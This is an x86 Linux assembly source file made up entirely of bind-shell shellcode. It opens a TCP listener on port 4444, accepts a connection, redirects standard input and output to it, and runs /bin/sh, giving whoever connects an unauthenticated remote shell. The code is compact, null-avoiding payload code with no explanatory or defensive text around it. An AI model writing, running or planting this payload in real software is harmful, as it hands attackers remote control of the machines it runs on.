;
;
;
;
global _start

section .text

_start:
	xor	ebx, ebx
	mul	ebx

	;listenfd=socket(AF_INET, SOCK_STREAM, 0)
	mov	al, 0x66
	inc	ebx
	push	edx
	push	ebx
	push	0x2
	mov	ecx, esp
	int	0x80

	;bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))
	pop	ebx
	push	edx
	push	word 0x5c11
	push	bx
	mov	ecx, esp
	push	0x10
	push	ecx
	push	eax
	mov	ecx, esp
	mov	ebp, eax
	mov	al, 0x66
	int	0x80

	;listen(listenfd, 1)
	mov	al, 0x66
	add	ebx, ebx
	push	0x1
	push	ebp
	mov	ecx, esp
	int	0x80

	;connfd=accept(listenfd, (struct sockaddr*)NULL, NULL)
	mov	al, 0x66
	inc	ebx
	push	edx
	push	edx
	push	ebp
	mov	ecx, esp
	int	0x80

	;dup2(connfd, 2); dup2(connfd, 1); dup2(connfd, 0);
	xchg	ebx, eax
	xor	ecx, ecx
	mov	cl,0x3
dupfd:
	dec	cl
	mov	al, 0x3f
	int	0x80
	jne	dupfd

	;execve("/bin/sh", NULL, NULL)
	xor	eax, eax
	push	edx
	push	0x68732f6e
	push	0x69622f2f
	mov	ebx, esp
	push	edx
	push	ebx
	mov	ecx, esp
	push	edx
	mov	edx, esp
	mov	al, 0xb
	int	0x80
